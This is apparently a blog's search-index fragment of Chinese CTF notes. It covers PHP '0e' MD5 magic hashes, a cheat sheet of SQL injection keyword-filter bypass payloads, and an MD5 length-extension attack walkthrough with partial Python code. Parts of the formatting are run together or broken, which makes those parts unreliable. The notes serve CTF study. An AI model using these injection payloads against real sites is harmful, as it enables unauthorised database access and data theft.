          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5缺陷0e</title>
      <link href="/2018/md5-compare-0e.html"/>
      <url>/2018/md5-compare-0e.html</url>
      
        <content type="html"><![CDATA[<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p><a id="more"></a><p>关于PHP hash比较缺陷详细介绍：<a href="http://www.freebuf.com/news/67007.html" target="_blank" rel="noopener">http://www.freebuf.com/news/67007.html</a></p><pre><code>0x01 md5(str)QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e5459932745177090343288558410200x02 md5(md5())0x03 md5(md5(str).&quot;SALT&quot;)20e774261293712168181959463563504</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> md5 </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入针对关键字过滤的绕过技巧</title>
      <link href="/2018/bypass-tech-for-sql-injection-keyword-filtering.html"/>
      <url>/2018/bypass-tech-for-sql-injection-keyword-filtering.html</url>
      
        <content type="html"><![CDATA[<p>在sql注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。</p><a id="more"></a><h2 id="一、过滤空格"><a href="#一、过滤空格" class="headerlink" title="一、过滤空格"></a>一、过滤空格</h2><ul><li>1.1.使用 <strong>注释符`/</strong>/`**</li></ul><pre><code>SELECT/**/name/**/FROM/**/table</code></pre><ul><li>1.2.使用 <strong>url编码</strong></li></ul><pre><code>%a0 发出去就是空格的意思，但是需要在burp中抓包后修改</code></pre><ul><li>1.3.使用 <strong>浮点数</strong></li></ul><pre><code>select * from users where id=8E0union select 1,2,3select * from users where id=8.0 select 1,2,3</code></pre><ul><li><p>1.4.使用 <strong>Tab代替空格</strong></p></li><li><p>1.5.使用 <strong>两个空格代替一个空格</strong></p></li><li><p>1.6.使用 <strong>括号</strong></p></li></ul><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。<br>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><p>例如：</p><pre><code>select(user())from dual where(1=1)and(2=2)</code></pre><p>这种过滤方法常常用于time based盲注,例如：</p><pre><code>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</code></pre><h2 id="二、过滤引号"><a href="#二、过滤引号" class="headerlink" title="二、过滤引号"></a>二、过滤引号</h2><ul><li>2.1.使用 <strong>16进制</strong></li></ul><p>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p><pre><code>select column_name  from information_schema.tables where table_name=&quot;users&quot;</code></pre><p>这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。<br><code>users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p><pre><code>select column_name  from information_schema.tables where table_name=0x7573657273</code></pre><h2 id="三、过滤逗号"><a href="#三、过滤逗号" class="headerlink" title="三、过滤逗号"></a>三、过滤逗号</h2><ul><li>3.1.使用 <strong>from关键字</strong></li></ul><p>对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from to</code>的方式来解决：</p><pre><code>select substr(database() from 1 for 1);select mid(database() from 1 for 1);</code></pre><ul><li>3.2.使用 <strong>join关键字</strong></li></ul><pre><code>union select 1,2     #等价于union select * from (select 1)a join (select 2)b</code></pre><ul><li>3.3.使用 <strong>like关键字</strong></li></ul><pre><code>select ascii(mid(user(),1,1))=80   #等价于select user() like &apos;r%&apos;</code></pre><ul><li>3.4.使用 <strong>offset关键字</strong></li></ul><p>对于limit可以使用offset来绕过：</p><pre><code>select * from news limit 0,1</code></pre><p>等价于下面这条SQL语句</p><pre><code>select * from news limit 1 offset 0</code></pre><h2 id="四、过滤注释符（-或-）"><a href="#四、过滤注释符（-或-）" class="headerlink" title="四、过滤注释符（#或--）"></a>四、过滤注释符（<code>#</code>或<code>--</code>）</h2><ul><li>4.1.手动闭合引号，不使用注释符</li></ul><pre><code>id=1&apos; union select 1,2,3||&apos;1</code></pre><p>或者：</p><pre><code>id=1&apos; union select 1,2,&apos;3</code></pre><h2 id="五、过滤比较符号-（-lt-和-gt-）"><a href="#五、过滤比较符号-（-lt-和-gt-）" class="headerlink" title="五、过滤比较符号 （&lt;和&gt;）"></a>五、过滤比较符号 （<code>&lt;</code>和<code>&gt;</code>）</h2><ul><li>5.1.使用 <strong><code>greatest()</code>、<code>least（）</code>函数</strong></li></ul><p>greatest()、least（）：（前者返回最大值，后者返回最小值）<br>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。<br>最常见的一个盲注的sql语句：</p><pre><code>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></pre><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。<br>那么上面的这条sql语句可以使用greatest变为如下的子句:</p><pre><code>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</code></pre><ul><li>5.2.使用 <strong><code>between</code> <code>and</code></strong></li></ul><p>between a and b：返回a，b之间的数据，不包含b。</p><h2 id="六、过滤等号（-）"><a href="#六、过滤等号（-）" class="headerlink" title="六、过滤等号（=）"></a>六、过滤等号（<code>=</code>）</h2><ul><li>6.1.使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</li></ul><h2 id="七、过滤or-and-xor-not"><a href="#七、过滤or-and-xor-not" class="headerlink" title="七、过滤or and xor not"></a>七、过滤<code>or</code> <code>and</code> <code>xor</code> <code>not</code></h2><ul><li>7.1.使用符号代替</li></ul><pre><code>and=`&amp;&amp;`  or=`||`   xor=`|`   not=`!`</code></pre><h2 id="八、过滤union，select，where等"><a href="#八、过滤union，select，where等" class="headerlink" title="八、过滤union，select，where等"></a>八、过滤<code>union</code>，<code>select</code>，<code>where</code>等</h2><ul><li>8.1.使用 <strong>注释符</strong></li></ul><p>常用注释符：</p><pre><code>//，-- , /**/, #, --+, -- -, ;,%00,--a</code></pre><p>用法：</p><pre><code>U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user</code></pre><ul><li>8.2.使用 <strong>大小写</strong></li></ul><pre><code>id=-1&apos;UnIoN/**/SeLeCT</code></pre><ul><li>8.3.使用 <strong>内联注释</strong></li></ul><pre><code>id=-1&apos;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</code></pre><ul><li>8.4.使用 <strong>双关键字绕过（若删除掉第一个匹配的union就能绕过）</strong></li></ul><pre><code>id=-1&apos;UNIunionONSeLselectECT1,2,3–-</code></pre><ul><li>8.5.使用 <strong>加号+拆解字符串</strong></li></ul><pre><code>如 `or ‘swords’ =‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ‘+’ …..’ )`</code></pre><h2 id="九、使用-各种编码绕过过滤"><a href="#九、使用-各种编码绕过过滤" class="headerlink" title="九、使用 各种编码绕过过滤"></a>九、使用 <strong>各种编码</strong>绕过过滤</h2><ul><li>9.1.如<code>URLEncode</code>编码，<code>ASCII</code>,<code>HEX</code>,<code>unicode</code>编码绕过</li></ul><pre><code>`or 1=1`即`%6f%72%20%31%3d%31`，而`Test`也可以为`CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)`</code></pre><h2 id="十、使用等价函数绕过过滤"><a href="#十、使用等价函数绕过过滤" class="headerlink" title="十、使用等价函数绕过过滤"></a>十、使用<strong>等价函数</strong>绕过过滤</h2><pre><code>hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　或者：substr((select &apos;password&apos;),1,1) = 0x70strcmp(left(&apos;password&apos;,1), 0x69) = 1strcmp(left(&apos;password&apos;,1), 0x70) = 0strcmp(left(&apos;password&apos;,1), 0x71) = -1</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5的Hash长度扩展攻击</title>
      <link href="/2018/md5-hash-length-extension-attack.html"/>
      <url>/2018/md5-hash-length-extension-attack.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、遇到的问题"><a href="#一、遇到的问题" class="headerlink" title="一、遇到的问题"></a>一、遇到的问题</h2><p>在一道web题目中遇到了以下判断:<br><code>if ($COOKIE[&quot;md5hash&quot;] === md5($secret . $input))</code></p><p>在该题目中我们可以掌握的参数有<code>md5hash</code>、<code>input</code>的值，<code>secret</code>的md5值和长度，我们需要想办法让这个判断通过。</p><p>由此想到了md5的hash长度扩展攻击。</p><a id="more"></a><h2 id="二、md5算法原理"><a href="#二、md5算法原理" class="headerlink" title="二、md5算法原理"></a>二、md5算法原理</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>md5是对一段信息（Message）产生信息摘要（Message-Digest），所谓信息就是指我们需要加密的原数据，信息摘要是数据经过一系列计算得出来的一个长度固定的数据（可以说是源数据的一个独一无二的指纹）。</p><h3 id="计算步骤"><a href="#计算步骤" class="headerlink" title="计算步骤"></a>计算步骤</h3><p>MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。</p><h4 id="第一步、填充"><a href="#第一步、填充" class="headerlink" title="第一步、填充"></a>第一步、填充</h4><p>如果输入信息的长度(bit)对512求余的结果不等于448，就需要填充使得对512求余的结果等于448。填充的方法是填充一个1和n个0。填充完后，信息的长度就为N*512+448(bit)；</p><h4 id="第二步、记录信息长度"><a href="#第二步、记录信息长度" class="headerlink" title="第二步、记录信息长度"></a>第二步、记录信息长度</h4><p>用64位来存储填充前信息长度。这64位加在第一步结果的后面，这样信息长度就变为N<em>512+448+64=(N+1)</em>512位。</p><h4 id="第三步、装入标准的幻数（四个整数）"><a href="#第三步、装入标准的幻数（四个整数）" class="headerlink" title="第三步、装入标准的幻数（四个整数）"></a>第三步、装入标准的幻数（四个整数）</h4><p>标准的幻数（物理顺序）是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（A&#x3D;(01234567)16，B&#x3D;(89ABCDEF)16，C&#x3D;(FEDCBA98)16，D&#x3D;(76543210)16）。如果在程序中定义应该是（A&#x3D;0X67452301L，B&#x3D;0XEFCDAB89L，C&#x3D;0X98BADCFEL，D&#x3D;0X10325476L）</span><br></pre></td></tr></table></figure><p>标准的初幻数是Md5算法固定的，不会变化，但是幻数本身是随着每一轮计算不断变动的。</p><h4 id="第四步、四轮循环运算"><a href="#第四步、四轮循环运算" class="headerlink" title="第四步、四轮循环运算"></a>第四步、四轮循环运算</h4><p>复杂运算，具体计算方法可以google一下代码。</p><h3 id="举个计算的例子"><a href="#举个计算的例子" class="headerlink" title="举个计算的例子"></a>举个计算的例子</h3><p>比如计算字符串<code>test</code>的md5值。</p><p>十六进制<code>0x74657374</code><br>二进制<code>0b1110100011001010111001101110100</code></p><p>这里与448模512不同余，补位后的数据如下:</p><p>十六进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000</span><br></pre></td></tr></table></figure><p>二进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0bspan><br></pre></td></tr></table></figure><p>将补位后的数据进行一次复杂的运算，计算出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A&#x3D;0xcd6b8f09</span><br><span class="line">B&#x3D;0x73d32146</span><br><span class="line">C&#x3D;0x834edeca</span><br><span class="line">D&#x3D;0xf6b42726</span><br></pre></td></tr></table></figure><p>数据小于512位，所以将ABCD通过小端规则转换就是MD5值：<code>098f6bcd4621d373cade4e832627b4f6</code></p><p>如果我输入的数据不是test而是一串很长的字符，换算出来大于512小于1024，就需要计算两次，第一次先计算前512位的ABCD的值，算出来后再用这个ABCD去计算后面512位的的ABCD的值，最后算出来的ABCD经过拼接就是这串字符的MD5了</p><h2 id="三、md5的hash扩展攻击"><a href="#三、md5的hash扩展攻击" class="headerlink" title="三、md5的hash扩展攻击"></a>三、md5的hash扩展攻击</h2><h3 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h3><p>如文章最初遇到的问题，由两个字符串组成一个字符串<code>$str=$a+$b</code>，第一个字符串<code>$a</code>不知道也不可控，只可控第二个字符串<code>$b</code>，同时知道第一个字符串<code>$a</code>的MD5值和长度，这时候将第二个字符串精心构造一下，便可以算出合成的字符串<code>$str</code>的MD5的值</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>要明白攻击的原理，需要对md5计算方法稍微了解一下，就是上边的几个步骤，我们先来看一下以上问题正常计算的步骤。</p><h4 id="正常的计算步骤"><a href="#正常的计算步骤" class="headerlink" title="正常的计算步骤"></a>正常的计算步骤</h4><p>假如第一个字符串<code>$a=“test”</code>,为了方便转为十六进制<code>0x74657374</code></p><p>构造第二个字符串首先手动将<code>$str</code>补成一个标准的可以直接计算的512位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str&#x3D;0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000</span><br></pre></td></tr></table></figure><p>这样子，这时候再在后面追加一个<code>0x746573748</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str&#x3D;0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000746573748</span><br></pre></td></tr></table></figure><p>这时候再将<code>$str</code>大于512位，程序会先将这串数据补为1024位，补充完如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str&#x3D;0x7465737480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000074657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000</span><br></pre></td></tr></table></figure><p>这时将<code>$str</code>分为两部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000</span><br></pre></td></tr></table></figure><p>这时候程序计算前一部分的ABCD的值，由于和之前算的test的数值是相同的所以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A&#x3D;0xcd6b8f09</span><br><span class="line">B&#x3D;0x73d32146</span><br><span class="line">C&#x3D;0x834edeca</span><br><span class="line">D&#x3D;0xf6b42726</span><br></pre></td></tr></table></figure><p>到了第二部分，第二部分的计算是用的第一部分的ABCD去计算，计算新的ABCD如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A&#x3D;0x226359e5</span><br><span class="line">b&#x3D;0x99df12eb</span><br><span class="line">C&#x3D;0x6853f59e</span><br><span class="line">D&#x3D;0xf5406385</span><br></pre></td></tr></table></figure><p>最后算出来的MD5是<code>e5596322eb12df999ef55368856340f5</code></p><h4 id="发现问题"><a href="#发现问题" class="headerlink" title="发现问题"></a>发现问题</h4><p>我们看到了，将原数据按长度拆分后，第一轮计算的结果会作为幻数用在第二轮计算中。而在我们的问题中，第一轮计算的结果我们是已知的，也就是说，我们知道了第二轮计算的幻数，可以进行接下来的运算。</p><p>因为知道了第一个字符串<code>$a</code>的长度，我们可以构造第二个字符串<code>$b</code>的值，也就是说我们手动在第二个字符串<code>$b</code>的前端添加一些特定数据，使得第一轮计算因为我们添加数据后符合一轮计算的原数据长度而只计算出第一个字符串的hash值。这样我们就可以利用这个结果作为我们二轮计算的幻数进行下面的计算，从而预测最终的md结果。</p><p>具体的操作步骤看一下例子。</p><h4 id="md5的hash长度扩展攻击操作实例"><a href="#md5的hash长度扩展攻击操作实例" class="headerlink" title="md5的hash长度扩展攻击操作实例"></a>md5的hash长度扩展攻击操作实例</h4><p>我们作为攻击者来复现一下刚才正常计算的那个过程。</p><h5 id="知道的条件"><a href="#知道的条件" class="headerlink" title="知道的条件"></a>知道的条件</h5><pre><code>1.$a的MD5(098f6bcd4621d373cade4e832627b4f6)2.$a的长度=43.$b我们可以任意控制</code></pre><p>由1我们可以逆推算出其ABCD的值</p><pre><code>A=0xcd6b8f09B=0x73d32146C=0x834edecaD=0xf6b42726</code></pre><p>我们构造<code>$b</code>的值，在前面添加特定长度的补全值：<br><code>$b=&#39;\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00&#39;+&#39;test&#39;</code></p><p>其中<code>\x80\x00\x00\x00\x00\x00\x00\x00</code>这一类的数据是在md5计算的补位过程中填充的数据，我们手动来填充一下，长度视已知的<code>$a的长度=4</code>决定。</p><p>此时$str如下，由于不知道$a，我们假设$a=”aaaa”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str&#x3D;&#39;aaaa&#39;+&#39;\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00&#39;+&#39;test&#39;</span><br></pre></td></tr></table></figure><h5 id="我们脑补一下程序计算str的过程"><a href="#我们脑补一下程序计算str的过程" class="headerlink" title="我们脑补一下程序计算str的过程"></a>我们脑补一下程序计算str的过程</h5><pre><code>1.由于大于512位，先补全为1024位，2.将其分为两部分3.计算第一部分的ABCD的值4.再用第一部分算出来的ABCD拿来算第二部分的值。</code></pre><p>这里由于第一部分的ABCD我们可以逆推出来，我们可以直接跳过前三部分直接进行第四部分的计算，只需要将标准的MD5的源码里面的初始的ABCD的值改为逆推出来的那个值</p><p>我们用假的初始的ABCD计算一下</p><p><code>0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000</code></p><p>的MD5，发现是<code>e5596322eb12df999ef55368856340f5</code>，和上面正向计算出来的一样！</p><p>到此，md5的hash扩展攻击结束。</p><h2 id="四、代码实现"><a href="#四、代码实现" class="headerlink" title="四、代码实现"></a>四、代码实现</h2><h3 id="my-md5-py"><a href="#my-md5-py" class="headerlink" title="my_md5.py"></a>my_md5.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author：DshtAnger</span></span><br><span class="line"><span class="comment"># theory reference:</span></span><br><span class="line"><span class="comment">#   blog：</span></span><br><span class="line"><span class="comment">#       http://blog.csdn.net/adidala/article/details/28677393</span></span><br><span class="line"><span class="comment">#       http://blog.csdn.net/forgotaboutgirl/article/details/7258109</span></span><br><span class="line"><span class="comment">#       http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html</span></span><br><span class="line"><span class="comment">#   RFC1321：</span></span><br><span class="line"><span class="comment">#       https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf</span></span><br><span class="line"><span class="comment">##############################################################################</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genMsgLengthDescriptor</span><span class="params">(msg_bitsLenth)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    ---args:</span></span><br><span class="line"><span class="string">            msg_bitsLenth : the bits length of raw message</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> __import__(<span class="string">"struct"</span>).pack(<span class="string">"&gt;Q"</span>,msg_bitsLenth).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_hex_8bytes</span><span class="params">(hex_str)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    --args:</span></span><br><span class="line"><span class="string">            hex_str: a hex-encoded string with length 16 , i.e.8bytes</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            transform raw message descriptor to little-endian </span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    hex_str = <span class="string">"%016x"</span>%int(hex_str,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">assert</span> len(hex_str)==<span class="number">16</span>    </span><br><span class="line">    <span class="keyword">return</span> __import__(<span class="string">"struct"</span>).pack(<span class="string">"&lt;Q"</span>,int(hex_str,<span class="number">16</span>)).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_hex_4bytes</span><span class="params">(hex_str)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    --args:</span></span><br><span class="line"><span class="string">            hex_str: a hex-encoded string with length 8 , i.e.4bytes</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            transform 4 bytes message block to little-endian</span></span><br><span class="line"><span class="string">    '''</span>    </span><br><span class="line">    hex_str = <span class="string">"%08x"</span>%int(hex_str,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">assert</span> len(hex_str)==<span class="number">8</span>    </span><br><span class="line">    <span class="keyword">return</span> __import__(<span class="string">"struct"</span>).pack(<span class="string">"&lt;L"</span>,int(hex_str,<span class="number">16</span>)).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deal_rawInputMsg</span><span class="params">(input_msg)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    --args:</span></span><br><span class="line"><span 